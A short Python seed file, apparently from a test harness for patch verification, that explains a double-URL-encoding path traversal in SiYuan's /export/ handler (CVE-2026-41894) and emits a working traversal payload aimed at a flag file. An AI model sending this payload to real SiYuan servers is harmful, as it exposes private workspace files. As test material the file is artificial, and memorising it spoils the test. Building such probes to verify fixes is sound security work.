#!/usr/bin/env python3
"""[GIVEN] CVE-2026-41894 seed exploit — SiYuan /export/ double-URL-encode traversal.

Fired via a REAL external HTTP GET against the running, unmodified SiYuan kernel
(kernel/server/serve.go serveExport). Go's net/http percent-decodes URL.Path once
(%252e -> %2e), then serveExport calls url.PathUnescape() a SECOND time
(%2e -> "."), so "%252e%252e" -> ".." and filepath.Join(exportBaseDir, decodedPath)
escapes the export dir. exportBaseDir = <workspace>/temp/export, so two ".." climb
to <workspace>/pcb_flag.txt.

  reaches flag on V0 (v3.6.4, no containment guard)          -> HTTP 200 + flag body
  BLOCKED  on V1 (v3.6.5, CVE-2026-41894 adds gulu.File.IsSubPath(exportBaseDir,..)
                  -> HTTP 401 Unauthorized)
"""

# Two "%252e%252e" (double-encoded "..") to climb temp/export -> workspace.
ORIGINAL_PATH = "/export/%252e%252e/%252e%252e/pcb_flag.txt"


def candidate():
    return {"probe_id": "cve-2026-41894-export-seed", "path": ORIGINAL_PATH}


if __name__ == "__main__":
    import json

    print(json.dumps(candidate()))

